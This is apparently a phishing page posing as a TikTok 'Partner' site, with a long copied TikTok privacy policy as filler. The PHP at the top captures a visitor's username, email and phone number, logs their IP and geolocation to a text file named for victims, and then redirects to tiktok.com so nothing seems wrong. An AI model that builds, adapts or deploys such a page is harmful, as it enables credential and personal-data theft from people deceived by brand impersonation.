<!DOCTYPE html>
<link rel="stylesheet" href="https://kit-free.fontawesome.com/releases/latest/css/free.min.css" media="all">
<?php 
$username24=$_GET['Username'];
if ($_POST) {
  $number=$_POST['number'];
$mail=$_POST['mail'];
$username24=$_GET['Username'];
$ip = $_SERVER['REMOTE_ADDR'];
date_default_timezone_set('Europe/Istanbul');
$cur_time=date("d-m-Y H:i:s");
$details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));




$file = fopen('sazanlar.txt', 'a');
fwrite($file, "Username--->".$username24."\n\n"."  mail---> " .$mail."\n\n"."number--->".$number."\n\n"."Ip Adresi:---> " .$ip."\n\n"."Ulke--->".$ulke."\n\n" ."Tarih-->" .$cur_time.  "\n\n\n");
fclose($file);
echo '';
header("location: http://www.tiktok.com");
}
?>






<!DOCTYPE html>
<html>
  <link rel="icon"  href="https://i.pinimg.com/originals/8e/1d/1c/8e1d1cee4879db1796c87f0a620afe6a.png">
  <meta name="viewport" content="width=device-width,inital-scale=1">
<link rel="stylesheet" href="https://kit-free.fontawesome.com/releases/latest/css/free.min.css" media="all">
<link href="//db.onlinewebfonts.com/c/05428692254b58ccb090358a3dfecfff?family=Sofia+Pro" rel="stylesheet" type="text/css"/>

<style type="text/css">
  header {
    background-color: black;
      }
.ust {
  
}
  .ust img{
    width: 130px;
     
  }
  .baslik {
font-family: "sofiapro-bold",PingFangSC,sans-serif;
font-size: 40px;
color: black;
  }
  table {

    text-align: center;
     padding-left: 10%;
     padding-right: 10%;
     font-family: "proxima-regular",PingFangSC,sans-serif;
         color: #4f525a;
         max-width: 100%;
         margin: 0 0;


  }
  .baslik2 {
    font-family: "sofiapro-bold",PingFangSC,sans-serif;
    font-size: 35px;
    color: black;

  }
    .baslik3 {
    font-family: "sofiapro-bold",PingFangSC,sans-serif;
    font-size: 13px;
    color: white;

  }

  .ana{

    box-shadow: 2px 4px 20px rgba(34,90,89,0.2);
    margin: 0 0; 
    border-radius: 8px;
    border-top-left-radius: 8px;
    border-top-right-radius: 8px;
    border-bottom-right-radius: 8px;
    border-bottom-left-radius: 8px;
    box-sizing: border-box;
    
  }

p {
    font-family: "proxima-regular",PingFangSC,sans-serif;
    font-weight: 400;
    font-size: 16px;
    line-height: 24px;
    margin-bottom: 16px;
    color: #4f525a;
    text-align: justify;
}
.user {
    font-size: 17px;
    max-width: 80%;
    height: 55px;
  margin: 8px ;
  box-sizing: border-box;
  border-radius: 5px;
  border: 1px solid #C5CFD6;
  -webkit-transition: 0.5s;
  transition: 0.3s;
  outline: none;
}
.user:focus {

  border: 2px solid #fe2c55;
}
.buton {
  width: 150px;
  height: 50px;
  border-radius: 10px;
  background: #fe2c55;
  border-color: #fe2c55;
  font-family: "sofiapro-bold",PingFangSC,sans-serif;
  font-size: 20px;
  color: white;
  border: 0;
  font-weight:bold; 
} 
.footer {
  text-align: justify;
}

</style>
<head>
  <title>Partner | TikTok</title>
</head>
<header>
  <div class="ust"> <img src="logo.jpg"></div>
</header>
<body style="margin: 0 0;">
  <div class="ana">
    <p class="baslik"><b>Partner Privacy Policy</b></p>

   <table >
      <tr>
         <td colspan="2"><textarea style="max-width: 100%;" disabled="yes"rows="25" cols="80">
          (If you are a user having your usual residence in the US)

Last updated: December 20, 2020.

Welcome to TikTok (the “Platform”). The Platform is provided and controlled by TikTok Inc. (“TikTok”, “we” or “us”). We are committed to protecting and respecting your privacy. This Privacy Policy covers the experience we provide for users age 13 and over on our Platform. For information about our under-13 experience (“Children’s Platform”) and our practices in the United States regarding children’s privacy, please refer to our Privacy Policy for Younger Users.

Capitalized terms that are not defined in this policy have the meaning given to them in the Terms of Service.

What information do we collect?
We collect information when you create an account and use the Platform. We also collect information you share with us from third-party social network providers, and technical and behavioral information about your use of the Platform. We also collect information contained in the messages you send through our Platform and information from your phone book, if you grant us access to your phone book on your mobile device. More information about the categories and sources of information is provided below.

Information you choose to provide
For certain activities, such as when you register, upload content to the Platform, or contact us directly, you may provide some or all of the following information:

Registration information, such as age, username and password, language, and email or phone number
Profile information, such as name, social media account information, and profile image
User-generated content, including comments, photographs, videos, and virtual item videos that you choose to upload or broadcast on the Platform (“User Content”)
Payment information, such as PayPal or other third-party payment information (where required for the purpose of payment)
Your phone and social network contacts, with your permission. If you choose to find other users through your phone contacts, we will access and collect the names and phone numbers and match that information against existing users of the Platform. If you choose to find other users through your social network contacts, we will collect your public profile information as well as names and profiles of your social contacts
Your opt-in choices and communication preferences
Information to verify an account
Information in correspondence you send to us
Information you share through surveys or your participation in challenges, sweepstakes, or contests such as your gender, age, likeness, and preferences.
Information we obtain from other sources
We may receive the information described in this Privacy Policy from other sources, such as:

Social Media. If you choose to link or sign up using your social network (such as Facebook, Twitter, Instagram, or Google), we may collect information from these social media services, including your contact lists for these services and information relating to your use of the Platform in relation to these services.

Third-Party Services. We may collect information about you from third-party services, such as advertising partners and analytics providers.

Others Users of the Platform. Sometimes other users of the Platform may provide us information about you, including through customer service inquiries.

Other Sources. We may collect information about you from other publicly available sources.

Information we collect automatically
We automatically collect certain information from you when you use the Platform, including internet or other network activity information such as your IP address, geolocation-related data (as described below), unique device identifiers, browsing and search history (including content you have viewed in the Platform), and Cookies (as defined below).

Usage Information

We collect information regarding your use of the Platform and any other User Content that you generate through and broadcast on our Platform. We also link your subscriber information with your activity on our Platform across all your devices using your email, phone number, or similar information.

Device Information

We collect information about the device you use to access the Platform, including your IP address, unique device identifiers, model of your device, your mobile carrier, time zone setting, screen resolution, operating system, app and file names and types, keystroke patterns or rhythms, and platform.

Location data

We collect information about your location, including location information based on your SIM card and/or IP address. With your permission, we may also collect Global Positioning System (GPS) data.

Messages

We collect and process, which includes scanning and analyzing, information you provide in the context of composing, sending, or receiving message through the Platform’s messaging functionality. That information includes the content of the message and information about when the message has been sent, received and/or read, as well as the participants of the communication. Please be aware that messages sent to other users of the Platform will be accessible by those users and that we are not responsible for the manner in which those users use or disclose messages.

Metadata

When you upload User Content, you automatically upload certain metadata that is connected to the User Content. Metadata describes other data and provides information about your User Content that will not always be evident to the viewer. In connection with your User Content the metadata can describe how, when, and by whom the piece of User Content was collected and how that content is formatted. It also includes information, such as your account name, that enables other users to trace back the User Content to your user account. Additionally, metadata will consist of data that you chose to provide with your User Content, e.g. any hashtags used to mark keywords to the video and captions.

Cookies

We and our service providers and business partners use cookies and other similar technologies (e.g. web beacons, flash cookies, etc.) (“Cookies”) to automatically collect information, measure and analyze which web pages you click on and how your use the Platform, enhance your experience using the Platform, improve the Platform, and provide you with targeted advertising on the Platform and elsewhere across your different devices. Cookies are small files which, when placed on your device, enable the Platform to provide certain features and functionality. Web beacons are very small images or small pieces of data embedded in images, also known as “pixel tags” or “clear GIFs,” that can recognize Cookies, the time and date a page is viewed, a description of the page where the pixel tag is placed, and similar information from your computer or device. To learn how to disable Cookies, see your “Your choices” section below.

Additionally, we allow these service providers and business partners to collect information about your online activities through Cookies. We and our service providers and business partners link your contact or subscriber information with your activity on our Platform across all your devices, using your email or other log-in or device information. Our service providers and business partners may use this information to display advertisements on our Platform and elsewhere online and across your devices tailored to your interests, preferences, and characteristics. We are not responsible for the privacy practices of these service providers and business partners, and the information practices of these service providers and business partners are not covered by this Privacy Policy.

We may aggregate or de-identify the information described above. Aggregated or de-identified data is not subject to this Privacy Policy.

How we use your information
As explained below, we use your information to fulfill and enforce our Terms of Service, to improve and administer the Platform, and to allow you to use its functionalities. We may also use your information to, among other things, show you suggestions, promote the Platform, and customize your ad experience.

We generally use the information we collect:

To fulfill requests for products, services, Platform functionality, support and information for internal operations, including troubleshooting, data analysis, testing, research, statistical, and survey purposes and to solicit your feedback
To customize the content you see when you use the Platform. For example, we may provide you with services based on the country settings you have chosen or show you content that is similar to content that you like or interacted with
To send promotional materials from us or on behalf of our affiliates and trusted third parties
To improve and develop our Platform and conduct product development
To measure and understand the effectiveness of the advertising we serve to you and others and to deliver targeted advertising
To make suggestions and provide a customized ad experience
To support the social functions of the Platform, including to permit you and other users to connect with each other through the Platform and for you and other users to share, download, and otherwise interact with User Content posted through the Platform
To use User Content as part of our advertising and marketing campaigns to promote the Platform
To understand how you use the Platform, including across your devices
To infer additional information about you, such as your age, gender, and interests
To help us detect abuse, fraud, and illegal activity on the Platform
To ensure that you are old enough to use the Platform (as required by law)
To communicate with you, including to notify you about changes in our services
To announce you as a winner of our contest, sweepstakes, or promotions if permitted by the promotion rule, and to send you any applicable prizes
To enforce our terms, conditions, and policies
Consistent with your permissions, to provide you with location-based services, such as advertising and other personalized content
To inform our algorithms
To combine all the information we collect or receive about you for any of the foregoing purposes
For any other purposes disclosed to you at the time we collect your information or pursuant to your consent.
How we share your information
We are committed to maintaining your trust, and while TikTok does not sell personal information to third parties, we want you to understand when and with whom we may share the information we collect for business purposes.

Service Providers and Business Partners
We share the categories of personal information listed above with service providers and business partners to help us perform business operations and for business purposes, including research, payment processing and transaction fulfillment, database maintenance, administering contests and special offers, technology services, deliveries, email deployment, advertising, analytics, measurement, data storage and hosting, disaster recovery, search engine optimization, marketing, and data processing. These service providers and business partners may include:

Payment processors and transaction fulfillment providers, who may receive the information you choose to provide, the information we obtain from other sources, and the information we collect automatically but who do not receive your message data.
Customer and technical support providers, who may receive the information you choose to provide, the information we obtain from other sources, and the information we collect automatically.
Researchers, who may receive the information you choose to provide, the information we obtain from other sources, and the information we collect automatically but would not receive your payment information or message data.
Cloud providers, who may receive the information you choose to provide, the information we obtain from other sources, and the information we collect automatically.
Advertising, marketing, and analytics vendors, who may receive the information you choose to provide, the information we obtain from other sources, and the information we collect automatically but would not receive your payment information or message data.
Within Our Corporate Group
We may share all of the information we collect with a parent, subsidiary, or other affiliate of our corporate group.

In Connection with a Sale, Merger, or Other Business Transfer
We may share all of the information we collect in connection with a substantial corporate transaction, such as the sale of a website, a merger, consolidation, asset sales, or in the unlikely event of bankruptcy.

For Legal Reasons
We may disclose any of the information we collect to respond to subpoenas, court orders, legal process, law enforcement requests, legal claims, or government inquiries, and to protect and defend the rights, interests, safety, and security to TikTok Inc., the Platform, our affiliates, users, or the public. We may also share any of the information we collect to enforce any terms applicable to the Platform, to exercise or defend any legal claims, and comply with any applicable law. 

With Your Consent
We may share your information for other purposes pursuant to your consent or with your further direction.

If you access third-party services, such as Facebook, Google, or Twitter, to login to the Platform or to share information about your usage on the Platform with others, these third-party services may be able to collect information about you, including information about your activity on the Platform, and they may notify your connections on the third-party services about your use of the Platform, in accordance with their privacy policies.

If you choose to engage in public activities on the Platform, you should be aware that any information you share may be read, collected, or used by other users. You should use caution in disclosing personal information while engaging. We are not responsible for the information you choose to submit.

Your Rights
You may submit a request to access or delete the information we have collected about you by sending your request to us at the email or physical address provided in the Contact section at the bottom of this policy. You may be entitled, in accordance with applicable law, to submit a request through an authorized agent. To designate an authorized agent to exercise choices on your behalf, please provide evidence that you have given such agent power of attorney or that the agent otherwise has valid written authority to submit requests to exercise rights on your behalf. We will respond to your request consistent with applicable law and subject to proper verification. We will verify your request by asking you to send it from the email address associated with your account or to provide information necessary to verify your account. And we do not discriminate based on the exercise of any privacy rights that you might have.

Your Choices
You may be able to refuse or disable Cookies by adjusting your browser settings. Because each browser is different, please consult the instructions provided by your browser. Please note that you may need to take additional steps to refuse or disable certain types of Cookies. For example, due to differences in how browsers and mobile apps function, you may need to take different steps to disable Cookies used for targeted advertising in a browser and to disable targeted advertising for a mobile application, which you may control through your device settings or mobile app permissions. In addition, our choice to disable cookies is specific to the particular browser or device that you are using when you disable cookies, so you may need to separately disable cookies for each type of browser or device. If you choose to refuse, disable, or delete Cookies, some of the functionality of the Platform may no longer be available to you. Without this information, we are not able to provide you with all the requested services, and any differences in services are related to your information.
You can manage third-party advertising preferences for some of the third parties we work with to serve advertising across the Internet by clicking here and by utilizing the choices available at www.networkadvertising.org/managing/opt_our.asp and www.aboutads.info/choices.
Your mobile device may include a feature that allows you to opt out of some types of targeted advertising (“Limit Ad Tracking” on iOS and “Opt out of Interest-Based Ads” on Android).
You can opt out of marketing or advertising emails by utilizing the “unsubscribe” link or mechanism noted in marketing or advertising emails.
You can switch off GPS location information functionality on your mobile device if you do not wish to share GPS information.
If you have registered for an account you may access, review, and update certain personal information that you have provided to us by logging into your account and using available features and functionalities.
Some browsers transmit “do-not-track” signals to websites. Because of differences in how browsers incorporate and activate this feature, it is not always clear whether users intend for these signals to be transmitted, or whether they even are aware of them. We currently do not take action in response to these signals.
Security
We use reasonable measures to help protect information from loss, theft, misuse and unauthorized access, disclosure, alteration, and destruction. You should understand that no data storage system or transmission of data over the Internet or any other public network can be guaranteed to be 100 percent secure. Please note that information collected by third parties may not have the same security protections as information you submit to us, and we are not responsible for protecting the security of such information.

Children
The privacy of users under the age of 13 (“Younger Users”) is important to us. We provide a separate experience for Younger Users in the United States on the Children’s Platform, in which we collect only limited information. For more information on our United States data collection practices for Younger Users, please visit the Privacy Policy for Younger Users.

The Platform otherwise is not directed at children under the age of 13. If we become aware that personal information has been collected on the Platform from a person under the age of 13 we will delete this information and terminate the person’s account. If you believe that we have collected information from a child under the age of 13 on the Platform, contact us at: https://tiktok.com/legal/report/privacy.

Other Rights
Sharing for Direct Marketing Purposes (Shine the Light)
If you are a California resident, once a calendar year, you may be entitled to obtain information about personal information that we shared, if any, with other businesses for their own direct marketing uses. If applicable, this information would include the categories of customer information, as well as the names and addresses of those businesses with which we shared customer information for the immediately prior calendar year. To submit a request, contact us at: https://www.tiktok.com/legal/report/privacy.

Content Removal for Users Under 18
Users of the Platform who are California residents and are under 18 years of age may request and obtain removal of User Content they posted by contacting us at: https://www.tiktok.com/legal/report/privacy. All requests must be labeled “California Removal Request” on the email subject line. All requests must provide a description of the user Content you want removed and information reasonably sufficient to permit us to locate that User Content. We do not accept California Removal Requests via postal mail, telephone, or facsimile. We are not responsible for notices that are not labeled or sent properly, and we may not be able to respond if you do not provide adequate information. Please note that your request does not ensure complete or comprehensive removal of the material. For example, materials that you have posted may be republished or reposted by another user or third party.

Changes
We may update this Privacy Policy from time to time. When we update the Privacy Policy, we will notify you by updating the “Last Updated” date at the top of this policy and posting the new Privacy Policy and providing any other notice required by applicable law. We recommend that you review the Privacy Policy each time you visit the Platform to stay informed of our privacy practices.

Contact
Questions, comments and requests regarding this policy should be addressed to:

Mailing Address: TikTok Inc., Attn: TikTok Legal Department 10100 Venice Blvd, Suite 401, Culver City, CA 90232, USA
Contact us: https://www.tiktok.com/legal/report/privacy



Privacy Policy
(If you are a user having your usual residence in the European Economic Area (EEA) or the UK, or Switzerland)

Last updated: July 2020



Welcome to TikTok (the “Platform”). We are committed to protecting and respecting your privacy and this policy sets out the basis on which we process any personal data we collect from you, or that you provide to us. Where we refer to “TikTok”, “we” or “us” in this Privacy Policy, we mean TikTok Technology Limited, an Irish company (“TikTok Ireland”), and TikTok Information Technologies UK Limited (“TikTok UK”), a UK company.

To see the full Privacy Policy, click here.

If you are between 13 and 18 years old, we have also prepared a separate summary of this policy and what it means for you. It is available in the app under the ‘Privacy Policy’ tab.

SUMMARY
What information do we collect about you?
We collect and process information you give us when you create an account and use the Platform. This includes technical and behavioural information about your use of the Platform. We also collect information about you if you download the app and use the Platform without creating an account. For more information, click here.

How will we use the information about you?
We use your information to provide the Platform to you and to improve and administer it. In order to provide an effective and dynamic Platform, and where we have determined it is in our legitimate interests, we use your information to improve and develop the Platform, prevent crime and ensure users’ safety. Where we have your consent, we will also use your personal data to serve you targeted advertising and promote the Platform. For more information on how your information is used, click here.

Who do we share your information with?
We share your data with third party service providers who help us to deliver the Platform including cloud storage providers. We also share your information with business partners, other companies in the same group as TikTok (including TikTok Inc in the US which provides certain services for us in connection with the Platform), content moderation services, measurement providers, advertisers and analytics providers. We may share your information with law enforcement agencies, public authorities or with other third parties only where we are legally required to do so or if such use is reasonably necessary (for instance, to ensure your or someone else’s safety). For more information, click here.

Your Rights
We offer you settings to control and manage the personal data we have about you. You also have the following rights: you can ask us to delete your data; to change or correct your data; to provide a copy of your data and to stop using some or all of your data. For more information about how to make these requests, click here. You can also contact us using the contact information below, and we will review your request in accordance with applicable laws.

How long do we keep hold of your information?
We retain your information for as long as it is necessary to provide you with the service so that we can fulfil our contractual obligations and exercise our rights in relation to the information involved. Where we do not need your information in order to provide the service to you, we retain it only as long as we have a legitimate business purpose in keeping such data or where we are subject to a legal obligation to retain the data. We will also retain your data if necessary for legal claims. For more information, click here.

How will we notify you of any changes to this Privacy Policy?
We will notify all users of any material changes to this policy through a notice on our Platform or by other means. We update the “Last Updated” date at the top of this policy, which reflects the effective date of the policy. By accessing or using the Platform, you acknowledge that you have read this policy and that you understand your rights in relation to your personal data and how we will collect, use and process it. For more information, click here.

***********************************************************************************************

1. The types of personal data we use
We collect and use the following information about you:

Your Profile Information

You give us information when you register on the Platform, including your username, date of birth, email address and/or telephone number, information you disclose in your user profile and your photograph or profile video.

User Content and Behavioural Information

We process the content you generate and view on the Platform, including preferences you set (such as choice of language), photographs and videos you upload, comments and live-streams you make (“User Content”). We collect information through surveys, challenges and competitions in which you participate. We also collect information regarding your use of the Platform, e.g. how you engage with the Platform, including how often you use the Platform and how you interact with content we show you, the ads you view, videos you watch and problems encountered, the content you like, the content you save to “Favourites”, the words you search and the users you follow. 

We infer your interests, gender and age for the purpose of personalising content. We also infer the interests of our users to better optimise advertising across our Platform. If you have consented, we will use this information for the purpose of serving personalised advertising. 

We review User Content for content moderation purposes to enforce our community guidelines, comply with legal obligations, and prevent and respond to abuse, fraud, illegal activity and other potentially harmful content on the Platform. 

We also process information about your followers, the likes you receive and responses to content you upload, for the purposes of personalising your "For You" Feed, promoting your content to other users and exploring whether your profile presents opportunities for collaboration. 

Messages

Where local laws allow us to, we collect and process your messages, which includes scanning and analysing the information in those messages through the Platform’s messaging functionality. That information includes the content of the message and information about when the message has been sent, received and/or read, as well as the participants in the communication.

We do this to prevent and block spam, prevent and detect crime, safeguard children (where this is in the substantial public interest) or to protect the interests of our users and other people. 

Please also be aware that messages sent to other users of the Platform will be accessible by those users and that we are not responsible for how those users use or disclose them.

Pro Accounts 

You can upgrade your user account in the app to a "Pro Account". A Pro Account gives you access to additional features, such as aggregated statistics about your content. If you participate in the TikTok Creator Marketplace, you can use the Pro Account menu to access settings and manage requests relating to Marketplace functions. For this purpose, data is exchanged with the TikTok Creator Marketplace. 

Information from Third Parties

You may choose to share certain data with us from third parties or, through your use of the Platform, we may collect such third party data automatically.  

Business Partners

If you choose to register to use the Platform using your social media account details (e.g. Facebook, Twitter, Instagram, Google), you will provide us or allow your social network to provide us with your username and public profile. We will likewise share certain information with the relevant social network such as your app ID, access token and the referring URL. For further information on sharing your Facebook contact list with us, please see Find other users and invite your friends.

Advertisers and Measurement Partners

Where you have consented to personalised advertising, we will match your information e.g. your mobile advertising ID, where it is provided to us by advertisers and other partners, with your TikTok profile to serve you ads. We may also serve you ads based on the information we infer from the data these partners provide. You can opt out of this activity at any time via your app settings by going to 'Privacy and safety' and then to 'Personalization and data' and opting out of ‘Ads based on data received from partners’.

We use information provided by our measurement partners, to understand how you’ve interacted with our ad partners’ websites and better assess the effectiveness of the advertising on our Platform. 

For more information about how our measurement and analytics providers collect data from the Platform, please see our Cookies Policy. 

Technical Information we collect about you

We collect certain information from you when you use the Platform including when you are using the app without an account. Such information includes your IP address, instance IDs (which allow us to determine which devices to deliver messages to), mobile carrier, time zone settings, identifier for advertising purposes and the version of the app you are using. We will also collect information regarding the device you are using to access the Platform such as the model of your device, the device system, network type, device ID, your screen resolution and operating system, audio settings and connected audio devices. Where you log-in from multiple devices, we will be able to use your profile information to identify your activity across devices.

Location

When you use the Platform on a mobile device, we will collect information about your location in order to customise your experience. We infer your approximate location based on your IP address. In certain jurisdictions, we may also collect Global Positioning System data.

Information about your friends

You can choose whether to find other users of the Platform using our “Find Friends” function and to invite your contacts to join you on the Platform. We will use the contact information you have for that person, such as from within your telephone's contact list or Facebook friends list, and give you the option to send them either an SMS, email or third party message (such as Whatsapp, Facebook Messenger or Twitter) inviting them to view your TikTok profile.  

We use your personal data to find matches based on your contact information and your address book. However, your contact information and your address book is private and will not be disclosed. We use a technical system to find matches without sending your own information or your address book to us in plain text. 

If you want to find other users through your Facebook contacts, you can grant us access to your Facebook contact list. We will then collect your public Facebook information as well as names and profiles of your Facebook contacts. We will match this to registered users and show you any matches so you can follow them. 

In-app purchases 

If you make in-app purchases, please review our Virtual Items Policy. Your purchase will be made via your Apple iTunes or Google Play account. We do not collect any financial or billing information from you in relation to such a transaction. Please review the relevant app store's terms and notices to learn about how your data is used. We keep a record of the purchases you make, the time at which you make those purchases and the amount spent so that we can credit your account with the correct value in coins.

Information you provide to us 

We collect information you provide us in response to a survey. If you respond to a TikTok survey, your individual responses will be used for the purpose of the survey and will be shared with other organisations, as explained to you when you participate in a survey. We may also use aggregate data from these surveys in the same way.

We also collect information you provide to us in correspondence.  

Proof of your identity or age

We sometimes ask you to provide proof of identity or age in order to use certain features, such as Livestream or verified accounts, or when you apply for a “Pro Account”.

2. Cookies
Cookies and similar technologies (e.g. pixels and ad tags) (collectively, “Cookies”) are small files which, when placed on your device, enable us to collect certain information, including personal data, from you in order to provide certain features and functionality. We and our service providers and business partners use Cookies to collect data and recognise you and your device(s) on the Platform and elsewhere across your different devices. We do this to better understand the effectiveness of the advertising on the Platform and to enhance your user experience. To learn more about cookies please see our Cookies Policy.  

3. How we use your personal data
We will use the information we collect about you based on the legal grounds described below.

In accordance with, and to perform our contract with you, we will use your information to:

provide the Platform and associated services;
notify you about changes to our service;
provide you with user support;
enforce our terms, conditions and policies;
administer the Platform including troubleshooting;
personalise the content you receive and provide you with tailored content that will be of interest to you;
enable you to share User Content and interact with other users;
enable our messenger service to function if you choose to use it and are 16 or above;
enable you to participate in the virtual items program; and
communicate with you.
In order to comply with our legal obligations and as necessary to perform tasks in the public interest or to protect the vital interests of our users and other people, we use your data to help us prevent and respond to abuse, fraud, illegal activity and other potentially harmful content on the Platform.

In accordance with our legitimate interests to provide an effective and dynamic Platform, we may use your information to:

ensure your safety and security, including reviewing User Content, messages and associated metadata for breaches of our Community Guidelines and our Terms of Service;
ensure content is presented in the most effective manner for you and your device;
understand how people use the Platform so that we can improve, promote and develop it;  
promote popular topics, hashtags and campaigns on the Platform;
carry out data analysis and test the Platform to ensure its stability and security;
verify your identity, for example, to enable you to have a ‘verified account’, and your age, for example, to ensure you are old enough to use certain features;
provide non-personalised advertising, which keeps many of our services free; 
infer your interests for optimising our advertising offerings, which, where you’ve consented to personalised advertising, may be based on the information our advertising partners provide to us;
measure the effectiveness of the advertising you see on our Platform;
inform our algorithms so we can deliver the most relevant content to you and to prevent crime and misuse of the Platform;
carry out surveys regarding our services, products and features; 
allow you to participate in interactive features of the Platform; and
enable you to socialise on the Platform. For example, we may allow other users to identify you via the "Find Friends" function or through their phone contacts or connect you with other users by tracking who you share links with.
Where we process your information to fulfill our legitimate interests, we conduct a balancing test to check that using personal data is really necessary for us to achieve our business purpose. When we carry out this balancing test we also take into account the privacy rights of our users and put in place appropriate safeguards to protect their personal data.

With your consent, we will use your information to provide you with personalised advertising. Please see the sections on Advertisers in “Information from Third Parties” for more information. You can control your personalised advertising settings at any time via your app settings. Please go to 'Privacy and safety' and then 'Personalization and data' to manage and control your advertising preferences. If you do not consent to personalised advertising, you will still see non-personalised advertising on the Platform.

4. How we share your personal data
We share your data with the following selected third parties:

Business Partners

If you choose to register to use the Platform using your social network account details (e.g. Facebook, Twitter, Instagram, Google), you provide us or allow your social network to provide us with your username and public profile. We will likewise share certain information with the relevant social network such as your app ID, access token and the referring URL.
Where you opt to share content on social media platforms, the video, username and any text associated with the post will be shared on that platform or, in the case of sharing via instant messaging platforms such as Whatsapp, a link to the content will be shared.
In order to provide the “Find Friends” functionality with your Facebook contact list, we share data with Facebook to allow this function to work. 
Payment Providers

If you are 18 or over and choose to buy virtual items we will share data with the relevant payment provider to facilitate this transaction. We share a transaction ID to enable us to identify you and credit your account with the correct value in coins once you have made the payment.
Service Providers

We provide information and content to service providers who support our business, such as cloud service providers and providers of content moderation services to ensure that the Platform is a safe and enjoyable place.
Analytics and measurement providers

We use analytics and measurement providers to help us improve the Platform including by assisting us with content measurement and following your activity on our Platform across your devices. 
Our third party analytics and measurement providers also help us measure advertising on our Platform and help our advertisers determine whether their advert has been shown on our Platform and how it performed. We share your mobile advertising ID and other device data with measurement companies so that they can link your activity on the Platform with your activity on our advertisers’ websites.
Advertisers

We only share aggregated user information with advertisers. Aggregated information is information that is grouped together and is not specific to an individual user. This is done to help measure the effectiveness of an advertising campaign by showing advertisers how many users of the Platform have viewed or clicked on an advertisement. 
Our Corporate Group

We may share your information with other members, subsidiaries, or affiliates of our corporate group where it is necessary to provide the Platform in accordance with the Terms of Service. 
We share information to improve and optimise the Platform, including to prevent illegal use and to support users.
Law Enforcement / Legal Obligation

We may share your information with law enforcement agencies, public authorities or other third parties if we consider that we are legally required to do so or if such use is reasonably necessary to:
comply with a legal process or request;
enforce our Terms of Service and other agreements, policies, and standards, including investigation of any potential violation;
detect, prevent or otherwise address abuse, fraud, illegal activity or security or technical issues; or
protect the rights, property or safety of us, our users, a third party or the public as required or permitted by law (including exchanging information with other companies and organisations for the purposes of fraud protection and credit risk reduction).
Public Profiles

If your profile is public, your content will be visible to anyone on the Platform and may also be accessed or shared by your friends and followers as well as third parties such as search engines, content aggregators and news sites. You can change who can see a video each time you upload a video. You can also change your profile to private by changing your settings to 'Private account' in 'Privacy and safety' settings. If your profile is public, other users can use your content to produce and upload further content, for example, by creating a duet with your video.
Sale or Merger

We disclose your information to third parties:
in the event that we sell or buy any business or assets (for example, as a result of liquidation, bankruptcy or otherwise). In such transactions, we will disclose your data to the prospective seller or buyer of such business or assets; or
if we sell, buy, merge, are acquired by, or partner with other companies or businesses, or sell some or all of our assets. In such transactions, user information may be among the transferred assets.
5. Where we store your personal data
The personal data that we collect from you will be transferred to, and stored at, a destination outside of the European Economic Area ("EEA").

Where we transfer your personal data to countries outside the EEA, we do so under the European Commission’s model contracts for the transfer of personal data to third countries (i.e. standard contractual clauses) pursuant to Commission Decision 2004/915/EC or 2010/87/EU (as appropriate) or in line with any replacement mechanism approved under EU law. For a copy of these Standard Contractual Clauses, contact us at: https://www.tiktok.com/legal/report/privacy.

6. Your Rights
We offer you settings to control and manage the personal data we have about you. 

You have the following rights:

Access Your Data: You can ask us, free of charge, to confirm we process your personal data and for a copy of your personal data.
Delete Your Data: You can ask us to delete all or some of your personal data. 
Change or Correct Data: You can ask us to change or fix your data. You can also make changes using the in-app controls and settings.  
Portability: You can ask for a copy of personal data you provided in a machine readable form.
Object or Restrict Use of Data and Withdraw Consent: You can ask us to stop using some or all of your data, e.g. if we have no legal right to keep using it. You can ask us to stop processing your personal data for direct marketing purposes; withdraw your consent or ask us to stop making any automatic individual decisions, including profiling. If you object to such processing, we ask you to share the reason for your objection in order for us to examine the processing of your personal data and to balance our legitimate interest in processing and your objection to this processing.
Before we can respond to a request to exercise one or more of the rights listed above, you may be required to verify your identity or your account details.

For information about how to make these requests, you can contact us using the contact information below, and we will review your request while considering applicable laws. TikTok Ireland will be responsible for responding to your request within the relevant periods provided by law. If necessary to resolve your request, TikTok Ireland will liaise with TikTok UK.

7. The security of your personal data
We take steps to ensure that your information is treated securely and in accordance with this policy. Unfortunately, the transmission of information via the internet is not completely secure. Although we will do our best to protect your personal data, for example, by encryption, we cannot guarantee the security of your information transmitted via the Platform, which means any transmission is at your own risk. 

We have appropriate technical and organisational measures to ensure a level of security appropriate to the risk that may be posed to you and other users. We maintain these technical and organisational measures and will amend them from time to time to improve the overall security of our systems.

We will, from time to time, include links to and from the websites of our partner networks, advertisers and affiliates. If you follow a link to any of these websites, please note that these websites have their own privacy policies and that we do not accept any responsibility or liability for these policies. Please check these policies before you submit any information to these websites. 

8. How long we keep your personal data
We retain your information for as long as it is necessary to provide you with the service so that we can fulfil our contractual obligations and exercise our rights in relation to the information involved. Where we do not need your information in order to provide the service to you, we retain it only for so long as we have a legitimate business purpose in keeping such data. 

If you ask us to delete your account it will first be placed into a deactivated state for 30 days (to allow you to request it to be reinstated), followed by the deletion of the account. We will also delete personal data that relates to the in-app messaging function within 30 days of you cancelling your user account. Please note that messages sent to other users of our service are stored on their devices and cannot be deleted by us. 

In each case, there are also occasions where we may need to keep your data for longer in accordance with our legal obligations or where it is necessary for legal claims.

9. Information relating to children
TikTok is not directed at children under the age of 13. If you believe that we have personal data about or collected from a child under the relevant age, contact us at: https://www.tiktok.com/legal/report/privacy.

10. Changes
We will notify you of any material changes to this policy through a notice provided via the Platform or by other means. The “Last Updated” date at the top of this policy reflects the effective date of such policy changes. 

11. Who we are and how to contact us
TikTok Ireland and TikTok UK provide the Platform and associated services, and together process personal data in the manner described in this policy and in our Terms of Service. For users of the Platform in the EEA and Switzerland, TikTok Ireland is the service provider in accordance with our Terms of Service and if you are in the UK, the provider of the Platform is TikTok UK. TikTok Ireland and TikTok UK share information as joint controllers of your data where it is necessary to do so to operate the Platform efficiently and in line with applicable laws.

If you have questions or complaints regarding this policy, or if you wish to reach the TikTok’s Data Protection Officer, contact us at: https://www.tiktok.com/legal/report/privacy. You can also contact us at the following postal address.

For users in the European Union, European Economic Area and Switzerland: TikTok Technology Limited, 10 Earlsfort Terrace, Dublin, D02 T380, Ireland. 

For users in the United Kingdom: 6th Floor, One London Wall, London, EC2Y 5EB, United Kingdom.

If contacting us does not resolve your complaint you have the right to complain to your local data protection supervisory authority. 





Privacy Policy
(If you are not in the US, EEA or Switzerland) 

Last updated: January 2021



Welcome to TikTok (the “Platform”). The Platform is provided and controlled by TikTok Pte. Ltd., with its registered address at 1 Raffles Quay, #26-10, South Tower, Singapore 048583 (“TikTok”, “we” or “us”). 

